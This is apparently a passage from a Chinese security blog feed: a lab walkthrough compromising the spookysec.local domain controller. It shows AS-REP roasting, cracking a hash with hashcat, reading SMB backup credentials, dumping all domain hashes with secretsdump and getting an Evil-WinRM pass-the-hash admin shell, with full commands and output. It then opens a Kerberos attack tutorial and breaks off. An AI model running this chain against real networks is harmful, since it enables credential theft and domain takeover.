class="string">$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:0d046ef0e8ddef967f2e23e7d3a47a18$8438ee06768f86a66d80f1f4a8687c329ae898eb0a6816a004898f72944b2b122c668c7b05efab2d8a28cfa65c1e135cc73cc61d2e89202a103822005535ead7b5f1a677d0ce1a68484411c573b85cbf3a5deac6b37a93321b0e109abd544c194ab3b55eece4c84545bfb9dd4a576dfd531ea1c0935d4d3545205acc2b3a1896dd0f9bd546786d10d27c5c24b972e3516995f0fd0f0a36838aee0cf89a361e2f2394e7e9bb78330291a83efadc8022c281c0eda83486fd9a39fcb49e6c18a43b61534731af906f6c3229acd7012c51a8915784511f2ffe5c25220ced2d5ce90166dca7d5ce5806a038972ad4808971b0662e</span></span><br><span class="line"><span class="string">[-] User James doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User robin doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User darkstar doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User administrator doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User backup doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User paradox doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User JAMES doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User Robin doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User Administrator doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hashcat 破解 Kerberos 5 AS-REP etype 23 hash 得到密码 ：management2005</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt</span></span><br><span class="line">hashcat (v6.2.5) starting</span><br><span class="line"></span><br><span class="line">OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform <span class="comment">#1 [The pocl project]</span></span><br><span class="line">=====================================================================================================================================</span><br><span class="line">* Device <span class="comment">#1: pthread-11th Gen Intel(R) Core(TM) i7-11370H @ 3.30GHz, 1428/2921 MB (512 MB allocatable), 4MCU</span></span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Optimizers applied:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) backend kernels selected.</span><br><span class="line">Pure kernels can crack longer passwords, but drastically reduce performance.</span><br><span class="line">If you want to switch to optimized kernels, append -O to your commandline.</span><br><span class="line">See the above message to find out about the exact limits.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Host memory required <span class="keyword">for</span> this attack: 0 MB</span><br><span class="line"></span><br><span class="line">Dictionary cache hit:</span><br><span class="line">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344385</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line"></span><br><span class="line">Cracking performance lower than expected?                 </span><br><span class="line"></span><br><span class="line">* Append -O to the commandline.</span><br><span class="line">  This lowers the maximum supported password/salt length (usually down to 32).</span><br><span class="line"></span><br><span class="line">* Append -w 3 to the commandline.</span><br><span class="line">  This can cause your screen to lag.</span><br><span class="line"></span><br><span class="line">* Append -S to the commandline.</span><br><span class="line">  This has a drastic speed impact but can be better <span class="keyword">for</span> specific attacks.</span><br><span class="line">  Typical scenarios are a small wordlist but a large ruleset.</span><br><span class="line"></span><br><span class="line">* Update your backend API runtime / driver the right way:</span><br><span class="line">  https://hashcat.net/faq/wrongdriver</span><br><span class="line"></span><br><span class="line">* Create more work items to make use of your parallelization power:</span><br><span class="line">  https://hashcat.net/faq/morework</span><br><span class="line"></span><br><span class="line">$krb5asrep$23<span class="variable">$svc</span>-admin@SPOOKYSEC.LOCAL:0d046ef0e8ddef967f2e23e7d3a47a18<span class="variable">$8438ee06768f86a66d80f1f4a8687c329ae898eb0a6816a004898f72944b2b122c668c7b05efab2d8a28cfa65c1e135cc73cc61d2e89202a103822005535ead7b5f1a677d0ce1a68484411c573b85cbf3a5deac6b37a93321b0e109abd544c194ab3b55eece4c84545bfb9dd4a576dfd531ea1c0935d4d3545205acc2b3a1896dd0f9bd546786d10d27c5c24b972e3516995f0fd0f0a36838aee0cf89a361e2f2394e7e9bb78330291a83efadc8022c281c0eda83486fd9a39fcb49e6c18a43b61534731af906f6c3229acd7012c51a8915784511f2ffe5c25220ced2d5ce90166dca7d5ce5806a038972ad4808971b0662e</span>:management2005</span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)</span><br><span class="line">Hash.Target......: $krb5asrep$23<span class="variable">$svc</span>-admin@SPOOKYSEC.LOCAL:0d046ef0e8d...b0662e</span><br><span class="line">Time.Started.....: Mon May 30 14:56:22 2022 (13 secs)</span><br><span class="line">Time.Estimated...: Mon May 30 14:56:35 2022 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:   480.2 kH/s (1.28ms) @ Accel:256 Loops:1 Thr:1 Vec:16</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 5837824/14344385 (40.70%)</span><br><span class="line">Rejected.........: 0/5837824 (0.00%)</span><br><span class="line">Restore.Point....: 5836800/14344385 (40.69%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: manaiagal -&gt; man37o9</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Util: 64%</span></span><br><span class="line"></span><br><span class="line">Started: Mon May 30 14:55:48 2022</span><br><span class="line">Stopped: Mon May 30 14:56:36 2022</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用账号密码枚举SMB，得到backup用户密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient -L //10.10.122.125/ -U svc-admin%management2005 </span></span><br><span class="line"></span><br><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">backup          Disk      </span><br><span class="line">C$              Disk      Default share</span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">NETLOGON        Disk      Logon server share </span><br><span class="line">SYSVOL          Disk      Logon server share </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 10.10.122.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line">                                                                                                                                                                                 </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># smbclient //10.10.122.125/backup -U svc-admin%management2005 </span></span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Sun Apr  5 03:08:39 2020</span><br><span class="line">  ..                                  D        0  Sun Apr  5 03:08:39 2020</span><br><span class="line">  backup_credentials.txt              A       48  Sun Apr  5 03:08:53 2020</span><br><span class="line"></span><br><span class="line">8247551 blocks of size 4096. 3587256 blocks available</span><br><span class="line">smb: \&gt; mget backup_credentials.txt </span><br><span class="line">Get file backup_credentials.txt? y</span><br><span class="line">getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)</span><br><span class="line">smb: \&gt; <span class="built_in">exit</span></span><br><span class="line">                                                                                                                    ┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># cat backup_credentials.txt </span></span><br><span class="line">YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw     </span><br><span class="line"></span><br><span class="line">┌─(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># echo &quot;YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw&quot; | base64 -d</span></span><br><span class="line">backup@spookysec.local:backup2517860   </span><br></pre></td></tr></table></figure><p>利用backup 用户获取管理员hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># impacket-secretsdump spookysec.local/backup:backup2517860@10.10.122.125</span></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::</span><br><span class="line">spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::</span><br><span class="line">spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::</span><br><span class="line">spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::</span><br><span class="line">spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::</span><br><span class="line">spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::</span><br><span class="line">spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::</span><br><span class="line">spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::</span><br><span class="line">spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::</span><br><span class="line">spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::</span><br><span class="line">spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::</span><br><span class="line">spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::</span><br><span class="line">spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::</span><br><span class="line">spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::</span><br><span class="line">spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::</span><br><span class="line">ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:1583681d41dc2c7ca6aa961cc23d8ec8:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae</span><br><span class="line">Administrator:des-cbc-md5:2079ce0e5df189ad</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902</span><br><span class="line">krbtgt:des-cbc-md5:b94f97e97fabbf5d</span><br><span class="line">spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04</span><br><span class="line">spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233</span><br><span class="line">spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f</span><br><span class="line">spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5</span><br><span class="line">spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425</span><br><span class="line">spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064</span><br><span class="line">spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112</span><br><span class="line">spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6</span><br><span class="line">spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9</span><br><span class="line">spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe</span><br><span class="line">spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510</span><br><span class="line">spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054</span><br><span class="line">spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd</span><br><span class="line">spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e</span><br><span class="line">spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594</span><br><span class="line">spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499</span><br><span class="line">spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be</span><br><span class="line">spookysec.local\darkstar:des-cbc-md5:758af4d061381cea</span><br><span class="line">spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067</span><br><span class="line">spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e</span><br><span class="line">spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a</span><br><span class="line">spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3</span><br><span class="line">spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8</span><br><span class="line">spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64</span><br><span class="line">spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0</span><br><span class="line">spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8</span><br><span class="line">spookysec.local\paradox:des-cbc-md5:83988983f8b34019</span><br><span class="line">spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347</span><br><span class="line">spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa</span><br><span class="line">spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86</span><br><span class="line">spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166</span><br><span class="line">spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c</span><br><span class="line">spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157</span><br><span class="line">spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518</span><br><span class="line">spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff</span><br><span class="line">spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d</span><br><span class="line">spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922</span><br><span class="line">spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197</span><br><span class="line">spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89</span><br><span class="line">spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242</span><br><span class="line">spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68</span><br><span class="line">spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9</span><br><span class="line">ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:14cf17420c1c50fa7c55588b6bb0e857590e45f98cf5923d0e33316ef6589b6e</span><br><span class="line">ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:ab962df9e490918881be8544207c4c0c</span><br><span class="line">ATTACKTIVEDIREC$:des-cbc-md5:f719d0c858a73d0e</span><br><span class="line">[*] Cleaning up... </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-Evil-WinRM-登录域控制器"><a href="#4-Evil-WinRM-登录域控制器" class="headerlink" title="#4 Evil-WinRM 登录域控制器"></a>#4 Evil-WinRM 登录域控制器</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># evil-winrm -i 10.10.122.125 -u administrator -H 0e0363213e37b94221497260b0bcb4fc</span></span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.3</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm<span class="comment">#Remote-path-completion</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami</span><br><span class="line">thm-ad\administrator</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Ethernet:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : eu-west-1.compute.internal</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::f893:989c:cb66:84dc%6</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 10.10.122.125</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.0.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 10.10.0.1</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0-信息收集&quot;&gt;&lt;a href=&quot;#0-信息收集&quot; class=&quot;headerlink&quot; title=&quot;#0 信息收集&quot;&gt;&lt;/a&gt;#0 信息收集&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gu</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Attacking Kerberos</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/Attacking-Kerberos/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/Attacking-Kerberos/</id>
    <published>2022-11-07T07:44:16.000Z</published>
    <updated>2022-11-07T07:47:32.742Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Attacking-Kerberos"><a href="#Attacking-Kerberos" class="headerlink" title="Attacking Kerberos"></a><strong>Attacking Kerberos</strong></h1><ul><li>使用 Kerbrute 和 Rubeus 等工具进行初始枚举</li><li>kerberoasting</li><li>使用 Rubeus 和 Impacket 进行 AS-REP 烘焙</li><li>金/银票攻击</li><li>传票</li><li>使用 mimikatz 的万能钥匙攻击</li></ul><h2 id="1-介绍"><a href="#1-介绍" class="headerlink" title="#1 介绍"></a>#1 介绍</h2><h4 id="什么是-Kerberos？"><a href="#什么是-Kerberos？" class="headerlink" title="什么是 Kerberos？-"></a>什么是 Kerberos？-</h4><p>Kerberos 是 Microsoft Windows 域的默认身份验证服务。通过使用第三方票据授权以及更强的加密，它旨在比 NTLM 更“安全”。尽管 NTLM 有更多的攻击向量可供选择，但 Kerberos 仍然有一些潜在的漏洞，就像我们可以利用的 NTLM 一样。</p><h4 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语 -"></a>常用术语 -</h4><ul><li><strong>Ticket Granting Ticket 票据授予票据 (TGT)</strong> - 票据授予票据是一种身份验证票据，用于从 TGS 向域中的特定资源请求服务票据。</li><li><strong>Key Distribution Center 密钥分发中心 (KDC)</strong> - 密钥分发中心是一种用于发布 TGT 和服务票据的服务，包括身份验证服务和票据授予服务。</li><li><strong>Authentication Service 身份验证服务</strong> <strong>(AS)</strong> - 身份验证服务发出 TGT 以供域中的 TGS 使用， 以请求访问其他机器和服务票据。</li><li><strong>Ticket Granting Service 票据授予服务 (TGS)</strong> - 票据授予服务获取 TGT 并将票据返回到域上的机器。</li><li><strong>Service Principal Name 服务主体名称 (SPN)</strong> - 服务主体名称是提供给服务实例的标识符，用于将服务实例与域服务帐户相关联。Windows 要求服务具有域服务帐户，这就是服务需要 SPN 集的原因。</li><li><strong>KDC Long Term Secret Key KDC 长期密钥 (KDC LT Key)</strong> - KDC 密钥基于 KRBTGT 服务帐户。它用于加密 TGT 和签署 PAC。</li><li><strong>Client Long Term Secret Key 客户端长期密钥（客户端 LT 密钥）</strong> - 客户端密钥基于计算机或服务帐户。它用于检查加密的时间戳并加密会话密钥。</li><li><strong>Service Long Term Secret Key 服务端长期密钥 (Service LT Key)</strong> - 服务密钥基于服务帐户。它用于加密服务票据的服务部分并签署 PAC。</li><li><strong>Session Key 会话密钥</strong>- 在发布 TGT 时由 KDC 发布。用户在请求服务票据时将向 KDC 提供会话密钥以及 TGT。</li><li><strong>Privilege Attribute Certificate 特权属性证书 (PAC)</strong> - PAC 保存用户的所有相关信息，它与 TGT 一起发送到 KDC，由目标 LT 密钥和 KDC LT 密钥签名，以验证用户。</li></ul><h4 id="详细的带预认证的-AS-REQ"><a href="#详细的带预认证的-AS-REQ" class="headerlink" title="详细的带预认证的 AS-REQ -"></a>详细的带预认证的 AS-REQ -</h4><p>当用户从 KDC 请求 TGT 时，Kerberos 身份验证中的 AS-REQ 步骤开始。为了验证用户并为用户创建 TGT，KDC 必须遵循这些确切的步骤。第一步是用户加密时间戳 NT 哈希并将其发送到 AS。KDC 尝试使用来自用户的 NT 散列来解密时间戳，如果成功，KDC 将为用户发布 TGT 以及会话密钥。</p><h4 id="票据授予票据内容"><a href="#票据授予票据内容" class="headerlink" title="票据授予票据内容 -"></a>票据授予票据内容 -</h4><p>为了了解服务票证是如何创建和验证的，我们需要从票证的来源开始；TGT 由用户提供给 KDC，作为回报，KDC 验证 TGT 并返回服务票证。</p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/0e6df39b088b69673b03bf3ba4606e9d.png" alt="image-20220531094650428" style="zoom: 25%;" /><h4 